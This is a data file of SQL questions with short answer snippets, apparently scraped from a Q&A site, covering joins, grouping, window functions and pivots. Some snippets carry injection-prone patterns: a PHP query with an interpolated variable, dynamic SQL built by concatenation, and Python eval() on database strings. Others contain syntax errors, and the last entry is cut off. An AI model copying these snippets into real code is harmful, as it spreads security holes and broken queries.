1199,7592,SQL query to show only completed GROUPED BY results,"SELECT * FROM yourTable WHERE ResultRef = 'A' and UserRef NOT IN 
 (SELECT DISTINCT UserRef FROM yourTable 
  WHERE ResultRef != 'A')
"
35423,395,Access VBA SQL: Find Max Date and retrieve row ID,"SELECT test.ID, test.Inv, test.TDate, test.Status
FROM test INNER JOIN 
   (SELECT test.Inv, Max(test.TDate) AS MaxOfTDate
    FROM test
    GROUP BY test.Inv)  AS q 
ON (test.TDate = q.MaxOfTDate) AND (test.Inv = q.Inv)
GROUP BY test.ID, test.Inv, test.TDate, test.Status;
"
21184,17414,T-sql rank for max and min value,"with cte(id, RankValue,RankName) as (
            SELECT id, RankValue,RankName
            FROM 
                        (SELECT id,  OverallRank,  FirstRank,  SecondRank, Nrank 
                        FROM ##input) p
            UNPIVOT
                        (RankValue FOR RankName IN 
                                    (OverallRank,  FirstRank,  SecondRank, Nrank)
            )AS unpvt)
select t1.id, max(case when RankName = 'OverallRank'  then RankValue else null end) as OverallRank,
        max(case when t1.RankValue = t2.MaxRankValue then RankName else null end) as BestRankName,
        MAX(t2.MaxRankValue) as BestRankValue,
        max(case when t1.RankValue = t3.MinRankValue then RankName else null end) as WorstRankName,
        MAX(t3.MinRankValue) as WorstRankValue
        from cte as t1
        left join (select id, MAX(RankValue) as MaxRankValue from cte group by id) as t2 on t1.id = t2.id
        left join (select id, min(RankValue) as MinRankValue from cte group by id) as t3 on t1.id = t3.id
    group by t1.id
"
18429,21975,selecting data with highest field value in a field,"select user , index
from (
  select u.* , row_number() over (partition by user order by index desc) as rnk
  from   some_table u)
where rnk = 1
"
2006,55298,How to count used and free Licenses from 4 tables in SQL?,"create table License(ID int, Name varchar(200), Bought int)
create table Package(ID int, PkgName varchar(200), LicenseID int)

insert into License(ID,Name,Bought) values(1,'Office 2010',3)
insert into License(ID,Name,Bought) values(2,'Office 2007',2)
insert into License(ID,Name,Bought) values(3,'Office 2003',1)
insert into Substitute(ParentLicenseID, SubLicenseID) values(1,2)
insert into Substitute(ParentLicenseID, SubLicenseID) values(1,3)
insert into Substitute(ParentLicenseID, SubLicenseID) values(2,3)

select
    ParentLicenseID=l.ID,
    ParentLicenseName=l.Name,
    BoughtDirectly=coalesce(l.Bought,0),
    BoughtIndirectly=sum(coalesce(l2.Bought,0)),
    TotalBought=coalesce(l.Bought,0)+sum(coalesce(l2.Bought,0))
from
    License l
    left outer join Substitute s on s.SubLicenseID = l.ID
    left outer join License l2 on l2.ID = s.ParentLicenseID
group by
    l.ID,
    l.Name,
    l.Bought
"
17068,61358,Why ths works in anonymous but not in a procedure?,"create procedure tests authid CURRENT_USER is
  l_foo clob;
begin
select
regexp_replace(
  dbms_metadata.get_ddl('USER', 'SCOTT', null) ||
  dbms_metadata.GET_GRANTED_DDL ('SYSTEM_GRANT', 'SCOTT') ||
  dbms_metadata.GET_GRANTED_DDL ('OBJECT_GRANT', 'SCOTT') ||
  dbms_metadata.GET_GRANTED_DDL ('ROLE_GRANT', 'SCOTT')
,'""' || chr(10), '"";' || chr(10)) 
into l_foo 
from dual;
end;
/

SQL> EXEC tests 

PL/SQL procedure successfully completed
"
25708,7577,Determining child count of path,"UPDATE my_table a
   SET child_count = SELECT count(path) FROM my_table b WHERE b.path LIKE a.path || '/%';
"
7586,1095,SQL to return all related rows in a single column,"select
    itemID1, group_concat(cast(itemID2 as char) separator ',')
from
(
    select itemID1, itemID2 from st where itemID1 = :ID
    union 
    select itemID2, itemID1 from st where itemID2 = :ID
    union
    select s1.itemID2, s2.itemID2 from st as s1 inner join st as s2 on s1.itemID1 = s2.itemID1
    where s1.itemID2 = :ID
    union
    select s1.itemID1, s2.itemID1 from st as s1 inner join st as s2 on s1.itemID2 = s2.itemID2
    where s1.itemID1 = :ID
) as subquery
where itemID1 <> itemID2
group by itemID1
"
20453,47365,How do I remove an Identity completely,"Alter Table Tablename Add newColumnname int

Update Table set newColumnname =IdentityColumn

Alter Table TableName Drop IdentityColumnName
"
29923,51217,How to improve this transact-sql script for sql server 2005?,"SELECT TOP 1
        column_01, 
        COUNT(column_01) OVER(),
    SUM(CASE WHEN column_02=1 THEN 1 ELSE 0 END) OVER()
    FROM 
        table_01
    WHERE 
        status = 1
    ORDER BY column_02 desc, datetimestamp asc
"
35887,1863,"One to many join, displaying client list and it's client status based on other tables column","SELECT c.id, CONCAT(LEFT(c.name, 1), '.  ', c.surname) AS client_name,
       c.region, c.address, c.phone, c.fax, c.mobile, c.email,
       sum(CASE WHEN DATE(d.timestamp) < DATE(NOW()) and
                     d.debt = 0 and
                     d.total > 0
                THEN 1 else 0
           end) as Completed,
       sum(CASE WHEN DATE(d.timestamp) < DATE(NOW()) and
                     d.debt = 0 and
                     d.total = 0
                THEN 1 else 0
           end) as Pending,
       sum(CASE WHEN DATE(d.timestamp) < DATE(NOW()) and
                     d.debt > 0
                THEN 1 else 0
           end) as OverDue,
       sum(CASE WHEN DATE(d.timestamp) >= DATE(NOW()) and
                     d.debt > 0
                THEN 1 else 0
           end) as Scheduled,
      c.registered,
      DATE_FORMAT(c.registered, '%d-%m-%Y %H:%i:%s') AS stamp
FROM clients c LEFT OUTER JOIN
     drives d
     ON c.id = d.client 
GROUP BY c.id;
"
32844,40781,what driver to use when connecting to Oracle 10 with IBM RAD / Eclipse DTP?,"select sys_context ('userenv','instance_name') from dual; 
"
11067,68723,SQL Query issue,"SELECT p.id
FROM Plane p
JOIN Flight f ON f.id_Plane = p.id
JOIN Pilot pi ON f.id = pi.id_Pilot
GROUP BY p.id
HAVING COUNT(DISTINCT pi.id_Pilot) = (SELECT COUNT(*) FROM Pilot)
"
12084,65119,Consolidate rows in PostgreSQL,"select nodups.id, nodups.fname, nodups.lname, d1.data1, d2.data2
from
  (select min(id) as id, fname, lname from sample group by fname, lname) nodups
left join
  (select fname, lname, min(data1) as data1
   from (select fname, lname
           , first_value(data1) over (partition by fname, lname order by id) as data1
         from sample where data1 is not null) d1x
   group by fname, lname
  ) d1 using (fname, lname)
left join
  (select fname, lname, min(data2) as data2
   from (select fname, lname
           , first_value(data2) over (partition by fname, lname order by id) as data2
         from sample where data2 is not null) d2x
   group by fname, lname
  ) d2 using (fname, lname)
order by id
;
"
29036,2789,Query and Stored Procedure return different results,"DELIMITER //

CREATE DEFINER=`root`@`localhost` PROCEDURE `test`(IN p_user_id INT)
BEGIN
    # Retrieve user team from user_id
    SELECT CS_USER_TEAMS_ID
    FROM classicseasonmodel_classicseasonuserteam 
    WHERE user_id = p_user_id;
END//

DELIMITER ;
"
35749,7077,I need a query that retrieves this result,"select 
    maxscorejournalinstances.journalname,
    COUNT(*) as maxscorecount
from
    (
    select 
        journalname
        from
    foo inner join
        (
            select 
                authorid,
                MAX(authorscore) as maxscore
            from
                foo
            group by
                authorid
        ) maxauthorscores
    on foo.AuthorId = maxauthorscores.AuthorId 
    and foo.AuthorScore = maxauthorscores.maxscore
    ) maxscorejournalinstances
group by
    maxscorejournalinstances.JournalName
"
21436,42055,"Oracle group by, take first element from non-grouped column","SELECT person_id, account_login, add_date
  FROM (SELECT table.*
             , DENSE_RANK() OVER (PARTITION BY person_id ORDER BY add_date) rnk
         FROM table)
 WHERE rnk = 1;
"
13276,156,LEFT JOIN tables and SUM values that REGEXP specific characters,"SELECT m.user_id, yearsjobscope, yearsskill
FROM members m
JOIN (
  SELECT user_id, SUM(totalworkyear) yearsjobscope
  FROM members7 WHERE jobscope REGEXP 'Pharmacy'
  GROUP BY user_id) m7
  ON m.user_id = m7.user_id
JOIN (
  SELECT user_id, SUM(totalworkyear_2) yearsskill
  FROM members7_2 WHERE KnowledgeSkill REGEXP 'def'
  GROUP BY user_id) m7_2
  ON m.user_id = m7_2.user_id
"
10657,7142,Sql recursive query to create a unique list,"; WITH CategoryTree(CategoryID, sorthelp) AS
(SELECT CategoryID, 0 FROM Categories WHERE ParentID IS NULL)

UNION ALL

(SELECT C.CategoryID, CT.sorthelp + 1 FROM Categories C INNER JOIN CategoryTree CT ON C.PARENTID = CT.CategoryID)

SELECT DISTINCT TemplateID FROM RoleTemplates WHERE CategoryID IN (SELECT CategoryID FROM CategoryTree)
"
18682,48392,Populating NULLS from LEFT JOIN with values,"SELECT

    rates_Calendar.date,
    subQuery.name,
    COALESCE(subQuery.amount,0) as amount,
    subQuery.reference,
    subQuery.property


FROM
    rates_Calendar, (
                SELECT
                    rates_Booking.date,
                    unit.unit,
                    unit.abbreviation as name,
                    rates_Booking.amount,
                    rates_Booking.bookingReference AS reference,
                    property.property


                FROM
                    rates_Booking

                    LEFT JOIN booking ON booking.reference = rates_Booking.bookingReference

                    LEFT JOIN unit ON booking.apartment = unit.unit

                    LEFT JOIN property ON property.property = unit.property

                    # unit to apartments
                    LEFT JOIN apartments ON (apartments.unit = unit.unit)
                    LEFT JOIN apartmentTypes ON (apartmentTypes.id = apartments.apartmentTypeId)

                WHERE
                    rates_Booking.date BETWEEN @startDate AND @endDate
                    AND unit.unit = 221



                GROUP BY
                    property.area,
                    property.property,
                    apartmentTypes.id,
                    unit.unit,
                    rates_Booking.date

                ) AS subQuery


 WHERE
   rates_Calendar.date BETWEEN @startDate AND @endDate
"
36458,41515,Select all users with one role and one role only - many 2 many relationship,"SELECT users.*, COUNT(*) AS role_count, 
       SUM(case roles.name when 'user' then 1 else 0 end) AS IsUser
FROM users
JOIN roles_users
 ON users.id = roles_users.user_id
JOIN roles
 ON roles_users.role_id = roles.id
GROUP BY users.id
HAVING COUNT(*) = 1
AND SUM(case roles.name when 'user' then 1 else 0 end) = 1
"
9881,46362,T-SQL function does not return all values,"CREATE FUNCTION [dbo].[fnGetMemberNames] (@MEMBERSHIPID VARCHAR(100))
RETURNS VARCHAR(max)
BEGIN
  DECLARE @name_to_return AS VARCHAR(max);
  SET @name_to_return = NULL;
  SELECT  @name_to_return = ISNULL(@name_to_return,'') +
             (C.TITLE + ' ' + C.FIRSTNAME + ' ' + C.SURNAME) + Char(13) + Char(10) 
  FROM CONTACT C
  LEFT JOIN MEMBERSHIP M
    ON C.SERIALNUMBER=M.SERIALNUMBER
    WHERE M.MEMBERSHIPID=@MEMBERSHIPID;
  RETURN @name_to_return ;

END;
"
23404,3457,PostgreSQL select all from one table and join count from table relation,"select p.*, coalesce(t1.p_count,0)
from post_categories p
left join (
    select post_category_id, count(*) p_count
    from posts
    group by post_category_id
) t1 on t1.post_category_id = p.id
"
5109,26646,CRM How to Find Account without Active Contacts,"SELECT
  *
FROM
  dbo.Account a -- all accounts
WHERE
  NOT EXISTS( -- for which no contact exists
    SELECT
      1
    FROM
      dbo.Contact c
    WHERE
      c.ParentCustomerId=a.AccountId AND
      c.StateCode<>0 -- that is active
  );
"
38723,25010,Mysql Agregate function to select maximum and then select minimum price within that group,"SELECT x.* 
  FROM my_table x 
  JOIN 
     ( SELECT discount,MIN(price) min_price FROM my_table GROUP BY discount) y 
    ON y.discount = x.discount 
   AND y.min_price = x.price;
"
7727,8901,"How do I convert a date format in SQL to YYYY,MM,DD but with commas instead of forward slashes, full stops or dashes?","SELECT replace(CONVERT(VARCHAR(10), GETDATE(), 102), '.', ',') AS [YYYY,MM,DD]
"
224,37386,SQL: GROUP BY multiple columns with CASE statement,"GROUP BY field1,
    CASE WHEN @myboolean=1 THEN field2 END,
    CASE WHEN @myboolean=1 THEN field3 END,
    CASE WHEN @myboolean=1 THEN field4 END
"
35714,3175,Oracle SQL query: how to use count,"select 
  userid,amount,term,apr, cnt
  from 
( select userid, amount, term,  apr
   RANK() OVER (PARTITION BY userid ORDER BY amount,term,apr) amount_rank,   
   COUNT(*) OVER (PARTITION BY userid) cnt
from 
   tableXYZ
) 
where amount_rank = 1 
"
14324,52623,Using Distinct with Specific Case,"select name, ae, bytes_alloc, maxbytes  from 
(select name, 
 max (ae) over (partition by name order by name) ae, 
 sum(bytes_alloc) over (partition by name order by name) bytes_alloc,
 sum(maxbytes) over (partition by name order by name) maxbytes,
 row_number() over (partition by name order by name) rn
 from tbl) s
 where s.rn = 1
"
8412,1086,find order by closest to number,"User.order(""abs(4 - <your-field-name-here>)"")
"
3279,11392,"How can I select all rows from one table, calculating a field value based on another table","select m.*,
       iif(exists (select 1
                   from merchandise_groups_merchandise as mgm
                   where m.id = mgm.merchandise_id and
                         mgm.merchandise_group_id = [group_id]
                  )), 1, 0) as IsInGroupFlag
from merchandizes as m
"
33126,28147,Constrain values in a table using values of a column in another table,"CREATE TABLE dbo.Requests 
  ( 
     Id               INT PRIMARY KEY, 
     RequestSchemeId  INT, 
     ReceivedByUserId INT, 
     UNIQUE (RequestSchemeId, ReceivedByUserId) 
  ) 

CREATE TABLE dbo.ForwardedRequests 
  ( 
     Id                INT PRIMARY KEY, 
     RequestId         INT REFERENCES Requests(Id), 
     ForwardedToUserId INT 
  ) 

GO 

CREATE VIEW dbo.ForwardedUserRequestSchemes 
WITH SCHEMABINDING 
AS 
  SELECT ForwardedToUserId, 
         RequestSchemeId 
  FROM   dbo.ForwardedRequests FR 
         JOIN dbo.Requests R 
           ON R.Id = FR.RequestId 

GO 

CREATE UNIQUE CLUSTERED INDEX ix 
  ON dbo.ForwardedUserRequestSchemes(ForwardedToUserId, RequestSchemeId) 
"
9032,63064,SELECT combination of two columns but not sequence,"select high_member, low_member, count(*)
from( select distinct greatest(member1, member2) as high_member, 
                      least(member1, member2) as low_member, 
                      journey 
      from sharesRoom )
group by high_member, low_member
"
12482,15934,MySQL GroupBy and Shows it horizontally,"SELECT  VendorID,
        SUM(CASE WHEN Score = 'A' THEN 1 ELSE 0 END),
        SUM(CASE WHEN Score = 'B' THEN 1 ELSE 0 END),
        SUM(CASE WHEN Score = 'C' THEN 1 ELSE 0 END)
FROM    tableName
GROUP BY VendorID
"
36280,37122,Write the content of sql row into varchar variable,"select 
  'id: ' + convert(varchar(10), id) + '; name: ' + name + 
  '; Age: ' + convert(varchar(10), age) + '; city: ' + city 
from test 
"
2619,14235,"How can I write a trigger that updates rows in the same table, before the insert is commited?","create table stock (
  stockId int primary key,
  price numeric(5, 2));

create table stockpricehistory (
  stockId int,
  price numeric(5,2),
  dateStart datetime,
  dateEnd datetime);

create trigger t_si before insert on stock
for each row
  insert into stockpricehistory values (new.stockId, new.price, current_timestamp, null);

create trigger t_su before update on stock
for each row begin
  update 
    stockpricehistory 
  set
    dateEnd = current_timestamp
  where
    stockId = new.stockId and
    dateEnd is null;
  insert into stockpricehistory values (new.stockId, new.price, current_timestamp, null);
end;
"
6418,57490,SQL Server Distinct Columns,"SELECT * FROM
(
SELECT 
aps.SERV_ACCT
, aps.ACCOUNT
, ROW_NUMBER() OVER (PARTITION BY aps.SERV_ACCT ORDER BY aps.INV_DATE DESC) [row]
    FROM tblAPSData aps
    INNER JOIN tblMEP_Meters mep
      ON aps.SERV_ACCT = mep.ServiceAccount
    INNER JOIN tblMEP_Sites site
      ON site.SiteID = mep.ID
    INNER JOIN tbl_MEP_Projects proj
      ON proj.ID = site.ProjectID
      AND proj.CustomerID = 8 -- Move this to appropriate table
      AND proj.Type = 1 --Move this to appropriate table assumed it was on proj
    INNER JOIN tblMEP_CustomerAccounts custAcc
      ON custAcc.AccountNumber = aps.Account
      AND custAcc.CustomerID = @CustomerID
      AND custAcc.UtilityCompanyID = @UtilityCompanyID
WHERE aps.INV_DATE > DATEADD(month, -6, getdate())
) data
WHERE
  data.row = 1
"
6457,4955,self join mysql complex query,"SELECT c1.id
FROM call_charges c1
LEFT JOIN call_charges c2
ON c1.id = c2.retry_id AND c2.is_paid = 1
WHERE c1.transaction_bid IS NOT NULL
AND c1.is_paid = 0
AND c2.id IS NULL
AND c1.retry_id IS NULL
"
17441,15863,How to list fields that are missing a trait and eliminate the ones that are not,"SELECT DISTINCT r.ResellerName
FROM DimReseller AS r
LEFT JOIN FactResellerSales AS rs
  ON r.ResellerKey = rs.ResellerKey)
LEFT JOIN DimProduct AS p
  ON rs.ProductKey = p.ProductKey)
LEFT JOIN DimProductSubcategory AS psc
  ON  p.ProductSubcategoryKey = psc.ProductSubcategoryKey)
LEFT JOIN DimProductCategory AS pc
  ON  psc.ProductCategoryKey = pc.ProductCategoryKey
 AND pc.ProductCategoryKey IN (1,2,3,4,5,6,7,8)
WHERE pc.ProductCategoryKey IS NULL
ORDER BY r.ResellerName
"
28770,10186,"How to find the *position* of a single record in a limited, arbitrarily ordered record set?","SELECT @row := 0; 
SELECT MAX( position ) 
  FROM ( SELECT @row := @row + 1 AS position
           FROM photos
          WHERE photo_gallery_id = 43
            AND date_created_on <= 'the-date-time-your-photo-was' 
          ORDER BY date_created_on ) positions;
"
1421,21336,Translate SQL Query into LINQ Query,"db.Server
    .Where
    (
        x=>
            db.Gruppen
            .Where(g=>g.Id == 1)
            .Select(g=>g.Name)
            .Contains(x.GruppenName)
    );
"
31145,60375,multivalued attributes and foreign keys,"user (
    user_id       PRIMARY KEY
  , first_name
  , middle_name
  , last_name
  ....
)

frduser (
    friendshipid  PRIMARY KEY
  , user_id       FOREIGN KEY REFERENCES user(user_id)
  , friend_id     FOREIGN KEY REFERENCES user(user_id)
"
21137,68248,Using Group By in MYSQL while using distinct on another column,"SELECT  `clicks_region`, COUNT(*) as TOTAL 
 FROM 
    (SELECT DISTINCT 'clicks_region', 'clicks_ip' 
     FROM 'clicks'
     WHERE `clicks_to_websites_id` = '1' 
     AND DATE(`clicks_date`) = DATE('2011-08-30' )) x
 GROUP BY `clicks_region`
"
4692,25225,SQL - Referencing 3 tables,"SELECT c.BRGY_ZONE_NUM,count(a.CHRCHFAMLY_ISBAPTIZED) as [Num of People Baptized]
from TBL_CHURCH a
left join 
TBL_INTRVW b
on a.QN_NUMBER=b.QN_NUMBER
left join 
TBL_AREA c
on b.ZONE_NUM=cRGY_ZONE_NUM
where a.CHRCHFAMLY_ISBAPTIZED='Yes'
group by  c.BRGY_ZONE_NUM
"
9248,70547,T-SQL help with multiple unpivot,"/*Create testing Data - You don't need this*/
SELECT * 
INTO #YourTable FROM 
(
SELECT 'GOLD' AS SERVICE, 0 AS ITEM1, 0 AS ITEM2, 0 AS ITEM3, 0 AS ITEM4 UNION ALL 
SELECT 'SILVER' AS SERVICE, 2 AS ITEM1, 2 AS ITEM2, 0 AS ITEM3, 2 AS ITEM4 UNION ALL 
SELECT 'BRONZE' AS SERVICE, 0 AS ITEM1, 4 AS ITEM2, 0 AS ITEM3, 26 AS ITEM4
) testdata


/*You just need this*/    
SELECT * 
FROM 
    /*Substitute the name of your table here*/
    (SELECT SERVICE, ITEM1, ITEM2, ITEM3, ITEM4 FROM #YourTable) BaseData
UNPIVOT
   (Vals FOR Item IN 
      (ITEM1, ITEM2, ITEM3, ITEM4)
 )AS unpvt
 PIVOT (SUM(Vals) FOR SERVICE IN ([GOLD],[SILVER],[BRONZE]) ) AS pvt;
"
10616,69039,Assigned query variable not recognized,"select  ( 3959 * acos( cos( radians('53.993252') ) 
* cos( radians( latitude ) ) 
* cos( radians( longitude ) 
- radians('-0.432470') ) 
+ sin( radians('53.993252') ) 
* sin( radians( latitude ) ) ) ) AS distance from items having distance < 1000
"
15980,40606,MySQL Order by Rand() at result top,"ORDER BY is_premium DESC,
         (CASE WHEN is_premium THEN rand() END),
         sorting DESC,
         published_date DESC,
         update_date DESC
"
16337,17568,Oracle view pulling data from schemas in different instances?,"CREATE VIEW MYVIEW AS  
SELECT X,Y,Z FROM A.MYTABLE 
UNION  
SELECT X,Y,Z FROM B.MYTABLE@<LinkName>
"
25806,2501,Access SQL Query using BETWEEN Statement and dates from a form,"SELECT Logs.Completed 
FROM Logs 
WHERE Logs.Completed >= Forms!UIBrowseCompleted!Text53 AND Logs.Completed  <= Forms!UIBrowseCompleted!Text55 
ORDER BY Logs.Completed;
"
17752,72786,Choice Table-Column from a variable,"@Id AS int
@Day AS nvarchar,
@RefDayId AS int
AS
DECLARE @sql   varchar(500)
SELECT @sql = 'UPDATE dbo.table1 SET table1.'||@Day||' = '||@RefDayId||' WHERE table1.Id = '||@Id
EXECUTE(@sql)
RETURN
"
27496,56704,Retrieving the latest record from a Table (Oracle SQLPlus),"select *
from (
  SELECT UserID, 
         ThreadId, 
         PostTime,
         ThreadType,
         Topic, 
         Detail,
         row_number() over (partition by userid order by posttime desc) as rn
  FROM Thread  
) t
where rn = 1
order by userid;
"
24395,50927,Subqueries using Oracle,"SELECT
Book_Customer.CustomerID, 
Book_Customer.lastname || ', ' || Book_Customer.firstname AS ""Customer Name"", 
Book_Customer.city
FROM Order_Items 
JOIN Book_Order ON Order_Items.OrderID = Book_Order.OrderID
JOIN Book_Customer ON Book_Customer.CustomerID = Book_Order.CustomerID
JOIN Books ON Books.BookID = Order_Items.BookID
WHERE Books.Retail = (SELECT MAX(Retail) FROM Books)
"
37482,9765,SQL INNER JOIN tables syntax,"$result = mysqli_query($con, ""SELECT * FROM student INNER JOIN class ON student.UID=class.UID AND class.ClassID='$classID'"");
"
25231,6096,How to replace TOP 1000 rows of select columns indiscriminately,"WITH topB AS (
SELECT TOP 1000 row_number() OVER(ORDER BY field_n) rn, b.* FROM table_b b
ORDER BY field_x),
topA AS (
SELECT row_number() OVER(ORDER BY field_m) rn, a.*
FROM table_a a)
UPDATE b
SET 
  b.Field_1 = a.Field_1,
  b.Field_2 = a.Field_2,
  b.Field_3 = a.Field_3
FROM 
  TopB b JOIN TopA a ON b.rn = a.rn
"
30624,190,XML Cannot Read using Select,"SELECT t.CARD_NO, t.INOUT_MODE,t.VERIFY_MODE
 FROM XMLTABLE ( XMLNAMESPACES('http://www.w3.org/2001/XMLSchema-instance' as ""i"", default 'http://schemas.datacontract.org/2004/07/ZKWebApi' ),'/Attendance/Records/Record'
               PASSING (SELECT xmlcol FROM BIZZXE_V2_SCH.BB)
               COLUMNS CARD_NO               NUMBER PATH 'EnrollNumber',
                       INOUT_MODE            NUMBER PATH 'InOutMode',
                       VERIFY_MODE           NUMBER PATH 'VerifyMode') T;
"
35713,36296,Counting columns containing data,"select t.*,
       ((case when jan is not null then 1 else 0 end) +
        (case when feb is not null then 1 else 0 end) +
        (case when mar is not null then 1 else 0 end) +
        (case when apr is not null then 1 else 0 end) +
        (case when may is not null then 1 else 0 end)
       ) as MonthsWithData       
from t;
"
22528,15328,Select script for selecting two columns in a table,"SELECT id, type FROM x
UNION  ALL
SELECT id, old_type FROM x WHERE old_type IS NOT NULL
ORDER  BY id;
"
5886,783,"Request access to nearby Oracle database, need update statement (ora-01031)","-- While logged in as ""denis""
GRANT UPDATE ON mytable TO artem;
"
38783,69870,Looping through words in PL/SQL,"WITH mydata AS
  (SELECT 1 AS id, 'Sudan China USA Africa' AS string FROM dual
   UNION ALL
   SELECT 2      , 'China Europe Sudan Asia'          FROM dual
  )
   , lookup AS
  (SELECT 'Sudan' AS word FROM dual
   UNION ALL
   SELECT 'China' FROM dual
   UNION ALL
   SELECT 'USA' FROM dual
  )
SELECT t.id
     , max(t.word) KEEP (DENSE_RANK LAST ORDER BY t.pos) lastword
FROM (SELECT mydata.id
           , pos.column_value AS pos
           , regexp_substr(mydata.string, '([^ ])+', 1, pos.column_value ) AS word
      FROM mydata
           CROSS JOIN
             TABLE
               (CAST
                  (MULTISET
                    (SELECT level
                     FROM dual 
                     CONNECT BY level <= regexp_count(mydata.string, '([^ ])+')
                    ) AS sys.odciNumberList
                 )
              ) pos) t
     INNER JOIN lookup l
       ON (t.word = l.word)
GROUP BY t.id

        ID LASTWORD              
---------- -----------------------
         1 USA                     
         2 Sudan                   
"
94,57813,Matching all values in IN clause,"select ItemID
from ItemCategory
where CategoryID in (5,6,7,8) 
group by ItemID
having count(distinct CategoryID) = 4 <--this number is # of unique items in IN clause
"
17165,63699,datediff not returning what I'm expecting,"declare @start_day datetime;
declare @end_day datetime;
declare @start_time datetime;
declare @end_time datetime;

set dateformat ymd

set @start_day = '2014-06-18';
set @end_day = '2014-06-18';
set @start_time = '09:00';
set @end_time = '17:30';

print cast(datediff(minute,@start_day + @start_time, @end_day + @end_time) as float) / 60;
"
3877,16080,Add field using ALTER TABLE in VBA,"ALTER TABLE ShouldImportMetricsIDs
ADD COLUMN [Import Status] YESNO;
"
18341,32654,MySQL: copy data from table to another,"select id, user1_id
from battle
union all
select id, user2_id
from battle;
"
4159,33424,How to display duplicate value in a specific field,"Select * From test
where test2 in (
    Select test2 From (
        Select test2, count(*) C from test
        where (Test4 BETWEEN @startdate AND @enddate) AND (isnumeric(test2) = 1)
        group by test2 
        having count(*) > 1 ) f
    )
"
20668,73209,Postgres: Expand JSON column into rows,"select id,
    (details ->> 'json1')::int as json1,
    (details ->> 'json2')::int as json2
from (
    select id, json_array_elements(details) as details
    from things
) s
;
 id | json1 | json2 
----+-------+-------
  1 |   123 |   456
  1 |   124 |   457
  2 |   234 |   567
"
33403,52366,Oracle Pattern matching in group by clause,"SELECT regexp_replace(emp_name, '=$', ''), count(*) AS countt
  FROM employees
 GROUP BY regexp_replace(emp_name, '=$', '');
"
38710,54641,SQL join when there is a corresponding post or not,"select c.CustomerId, p.PhoneNumber, cc.Complaint
from Customer c
inner join CustomerPhone p on p.CustomerId = c.CustomerId
left join CustomerComplaint cc on cc.CustomerId = c.CustomerId
"
31983,15528,How to use cascade delete vs restrict for referential integrity with one-to-one record relationships?,"-- mixed case not recommended
create table TABLE cpt_invoice ( 
   recid serial NOT NULL,
   cpt_recid integer references cpt (recid) on delete cascade,
   ninsurance numeric(10,2)
   -- more...
  )
"
7814,7620,How to check column value null or having value,"SELECT ProductName,UnitPrice*(UnitsInStock+IFNULL(UnitsOnOrder,0))
FROM Products
"
30209,62989,update one table using data from another table,"MERGE INTO dbo_finance
USING (SELECT IssueName1, cusip FROM AssetsC WHERE MinSecClass = 9) AS source 
ON dbo_finance.test = source.IssueName1
WHEN MATCHED THEN UPDATE SET dbo_finance.cusip9 = source.cusip;
"
19415,52750,Count number of Rows with the same value in a Column,"SELECT book_count,a.author_id,a.fn, a.ln 
FROM author a
JOIN
(
  SELECT c.author_id,COUNT(*) book_count FROM book c
  GROUP BY c.author_id
) b 
ON a.author_id = b.author_id
ORDER BY book_count DESC LIMIT 1
"
35375,60503,Relational Algebra and Confusing one Complex Examples,"all students
except
(
    all combinations of students and CS courses
    except
    all taken courses
)
"
17096,45828,resolving string (read from database) to list python,"str_db_bins_list = eval(str_db_bins)
str_db_lov_list  = eval(str_db_lov)
"
12453,24347,Is there a way to reuse a window in teradata?,"SELECT sum(salary) OVER (PARTITION BY depname ORDER BY salary DESC), avg(salary) OVER (PARTITION BY depname ORDER BY salary DESC)
FROM empsalary;
"
38488,13288,HIVE check for data from table 1 which is absent in table 2,"SELECT Table1.url, Table1.number
FROM Table1
LEFT OUTER JOIN Table2 ON Table1.url = Table2.url
WHERE Table2.url IS NULL
"
13271,69840,Picking the maximum value from an alpha-numeric column in MS Access,"SELECT max(val(mid([col],3))) FROM thetable;
"
34750,54539,Select 1 of many similar rows based on non-numerical priority,"select field1, field2, field3, field4
from (select t.*,
             row_number() over (partition by field1
                                order by (case when field2 = 'W' then 1
                                               when field2 = 'C' then 2
                                               when field2 = 'O' then 3
                                               else 4
                                         )
                               ) as seqnum
      from table t
     ) t
where seqnum = 1;
"
11708,40822,MySQL update query to prepend digit to existing column with integers values,"UPDATE t SET phone=CAST(CONCAT('10', phone) AS UNSIGNED)
"
25582,75375,SQL: Join Parent - Child tables,"SELECT * 
FROM Topics t
INNER JOIN Users tu on tu.userID = t.userID
LEFT JOIN Comments c on c.topicID = t.topicID
LEFT JOIN User cu on cu.userID = c.userID
"
39558,52385,How to get a negative rownumber in sql server,"WITH dataBefore AS
(
    SELECT d.*, rn = (-1) * row_Number() over (Order By CalculatedOn DESC)
    FROM dbo.TableName d
    WHERE CalculatedOn < GetDate()
)
, dataAfter AS
(
    SELECT d.*, rn = row_Number() over (Order By CalculatedOn ASC)
    FROM dbo.TableName d
    WHERE CalculatedOn >= GetDate()
)
SELECT * FROM
(
    SELECT db.*
    FROM dataBefore db
    UNION ALL 
    SELECT da.*
    FROM dataAfter da
)x
WHERE x.rn >= -50 AND x.RN <= 50
ORDER BY x.RN
"
4802,21565,SQL: Group by unchange status interval length," select min(start) as start, max(end) as end, e.status
 from (select e.*,
             (select min(start)
              from event e2
              where e2.status <> e.status and e2.start > e.start
             ) as nextperiodstart
      from event e
     ) e
 group by status, nextperiodstart
 order by 1
"
36693,15919,Issue with CASE statement not giving correct value,"case  
  when ([Medication]=""N"") AND ([Name]=""STYMES"") AND([Original Units] is not null) then ""Y"" 
  when ([Medication]=""N"") AND ([Name]=""STYMES"") AND([Original Units] is null) then ""N"" 
  when ([Medication]=""Y"") AND ([Name]=""STYMES"") AND([Original Units] is not null) then ""N"" 
  when ([Medication]=""Y"") AND ([Name]=""STYMES"") AND([Original Units] is null) then ""Y"" 
  else ""N""
end
"
18091,56809,Select last record from database on the basis of primary key,"SELECT TOP 1 AppointmentDate
FROM   tbAppointment
WHERE  MID = @MID
ORDER  BY ID DESC 
"
34370,35798,LINQ vs. SQL Joins And Groupings (w/ Specific Case),"var result = from ri in RequestItem
             join r in Request on ri.RequestID equals r.ID
             join i in Item on ri.ItemID equals i.ID
             join x in (from inv in Inventory
                        group inv by inv.ItemID into g
                        select new { ItemID = g.Key, Storage = g.Sum(x => x.Quantity) })
                        on ri.ItemID equals x.ItemID
             group new
             {
                 i.Name,
                 r.StatusId,
                 ri.Quantity,
                 x.Storage,
             }
             by i.Name into grp
             select new
             {
                 grp.Key,
                 Requested = grp.Where(x => x.StatusID == 2).Sum(x => x.Quantity),
                 Distributed = grp.Where(x => x.StatusID == 3).Sum(x => x.Quantity),
                 Storage = grp.Sum(x => x.Storage)
             }
"
1282,40433,"Each ID with how many “column1”, “column2” and “total ” and order them by “total”","select Payroll,
